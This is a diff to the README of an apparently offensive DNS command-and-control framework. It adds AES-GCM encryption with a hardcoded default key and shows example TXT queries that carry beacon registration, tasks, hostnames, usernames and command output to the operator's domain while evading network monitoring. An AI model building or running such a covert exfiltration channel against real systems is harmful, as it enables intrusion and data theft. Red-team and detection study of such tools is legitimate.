@@ -15,8 +15,8 @@ This C2 framework is designed to blend seamlessly with legitimate DNS traffic by
 
 ### To-Do
 
-- [ ] Base64Raw Encoding
-- [ ] Encryption
+- [x] AES-GCM Encryption
+- [x] Base36 Encoding (replaces HEX)
 - [ ] Gzip compression
 - [ ] Beacon/Task Cleanup
 - [ ] Ensure graceful exits
@@ -58,6 +58,7 @@ Edit `Server/config.json`:
   "ns2": "ns2.secwolf.net",
   "forward_dns": true,
   "upstream_dns": "8.8.8.8:53",
+  "encryption_key": "MySecretC2Key123!@#DefaultChange",
   "debug": false
 }
 ```
@@ -72,7 +73,8 @@ Edit `Client/config.json`:
   "server_domain": "secwolf.net",
   "dns_server": "",
   "query_type": "TXT",
-  "encoding": "hex",
+  "encoding": "aes-gcm-base36",
+  "encryption_key": "MySecretC2Key123!@#DefaultChange",
   "timeout": 10,
   "max_command_length": 800,
   "retry_attempts": 3,
@@ -81,7 +83,8 @@ Edit `Client/config.json`:
 }
 ```
 - `dns_server`: Leave empty to use system DNS (recommended) or specify custom DNS server
-- `encoding`: Use "hex" for reliable encoding (base64 has DNS compatibility issues)
+- `encoding`: Use "aes-gcm-base36" for encrypted reliable encoding
+- `encryption_key`: AES encryption key for C2 traffic (must match on both client/server)
 - `max_command_length`: Increased to 800 to handle chunked result metadata
 - `sleep_min/max`: Beacon interval randomization for operational security
 
@@ -116,8 +119,9 @@ The server includes an interactive console for managing beacons and issuing comm
 - Appears as normal subdomain lookups to network monitoring
 
 #### Encoding Protocol
-- **Hex encoding**: Reliable DNS-safe encoding without padding issues
-- **Message format**: `TYPE|BeaconID|Data...` pipe-delimited structure
+- **AES-GCM Encryption**: Encryption with authentication for C2 traffic
+- **Base36 Encoding**: DNS-safe encoding that handles encrypted binary data reliably
+- **Message format**: `TYPE|BeaconID|Data...` pipe-delimited structure (encrypted before encoding)
 - **Chunk handling**: Automatic splitting/reassembly for data over DNS limits
 
 ### DNS Communication Mechanics
@@ -139,16 +143,16 @@ Client → Local DNS Resolver → Root DNS Servers → TLD Servers → Your Auth
 
 **Step 1 - Initial Beacon Registration**
 ```
-DNS Query: TXT 48454c4c4f7c62656163...<timestamp>.secwolf.net
-Decoded:   HELLO|beacon-id|hostname|username|os-info
-Response:  TXT record with hex-encoded "ACK" (first registration)
+DNS Query: TXT 1k3m9n8p2q7r4s6t...<timestamp>.secwolf.net
+Decrypted: HELLO|beacon-id|hostname|username|os-info
+Response:  TXT record with encrypted+base36-encoded "ACK" (first registration)
 ```
 
 **Step 2 - Regular Beacon Checkins**
 ```
-DNS Query: TXT 434845434b494e7c6265...<timestamp>.secwolf.net  
-Decoded:   CHECKIN|beacon-id|hostname|username|os-info
-Response:  TXT record with:
+DNS Query: TXT 2a5b8c1d4e7f0g3h...<timestamp>.secwolf.net  
+Decrypted: CHECKIN|beacon-id|hostname|username|os-info
+Response:  TXT record with encrypted+base36-encoded:
            - "ACK" (no tasks pending)
            - "TASK|task-id|command" (task available)
 ```
@@ -171,31 +175,31 @@ Response:  TXT record with:
 
 **Small Results (< 50 bytes raw)**
 ```
-DNS Query: TXT 524553554c547c626561...<timestamp>.secwolf.net
-Decoded:   RESULT|beacon-id|task-id|output-data  
-Response:  TXT "ACK"
+DNS Query: TXT 9m2n5p8q1r4s7t0u...<timestamp>.secwolf.net
+Decrypted: RESULT|beacon-id|task-id|output-data  
+Response:  TXT encrypted "ACK"
 ```
 
 **Large Results (> 50 bytes raw) - Two-Phase Protocol**
 
 **Phase 1 - Metadata**
 ```
-DNS Query: TXT 524553554c545f4d455441...<timestamp>.secwolf.net
-Decoded:   RESULT_META|beacon-id|task-id|total-size|chunk-count
-Response:  TXT "ACK" 
+DNS Query: TXT 3a6b9c2d5e8f1g4h...<timestamp>.secwolf.net
+Decrypted: RESULT_META|beacon-id|task-id|total-size|chunk-count
+Response:  TXT encrypted "ACK" 
 ```
 
 **Phase 2 - Data Chunks**
 ```
-DNS Query 1: TXT 444154417c626561636f...<timestamp>.secwolf.net
-Decoded 1:   DATA|beacon-id|task-id|1|chunk-1-data
+DNS Query 1: TXT 7j0k3l6m9n2p5q8r...<timestamp>.secwolf.net
+Decrypted 1: DATA|beacon-id|task-id|1|chunk-1-data
 
-DNS Query 2: TXT 444154417c626561636f...<timestamp>.secwolf.net  
-Decoded 2:   DATA|beacon-id|task-id|2|chunk-2-data
+DNS Query 2: TXT 1s4t7u0v3w6x9y2z...<timestamp>.secwolf.net  
+Decrypted 2: DATA|beacon-id|task-id|2|chunk-2-data
 
 [... continues for all chunks ...]
 
-Response:    TXT "ACK" for each chunk
+Response:    TXT encrypted "ACK" for each chunk
 ```
 
 **Server-Side Reassembly**
@@ -208,17 +212,17 @@ Response:    TXT "ACK" for each chunk
 
 **Problem**: DNS resolvers cache responses, preventing real-time C2 communication
 
-**Solution**: Timestamp-based subdomain variation
+**Enhanced Solution**: Timestamp-based subdomain variation
 ```
-Original:  <hex-data>.secwolf.net
-Enhanced:  <hex-data>.<unix-timestamp>.secwolf.net
+Original:  <encrypted-base36-data>.secwolf.net
+Enhanced:  <encrypted-base36-data>.<unix-timestamp>.secwolf.net
 ```
 
 **Example DNS Queries**:
 ```
-1. 434845434b494e7c626561636f.1729123456.secwolf.net  
-2. 434845434b494e7c626561636f.1729123461.secwolf.net
-3. 434845434b494e7c626561636f.1729123466.secwolf.net
+1. 2a5b8c1d4e7f0g3h6i9j2k5l8m1n4p7q.1729123456.secwolf.net  
+2. 9x2y5z8a1b4c7d0e3f6g9h2i5j8k1l4m.1729123461.secwolf.net
+3. 7n0p3q6r9s2t5u8v1w4x7y0z3a6b9c2d.1729123466.secwolf.net
 ```
 
 Each query appears as different subdomain to DNS infrastructure, preventing caching while maintaining C2 communications.
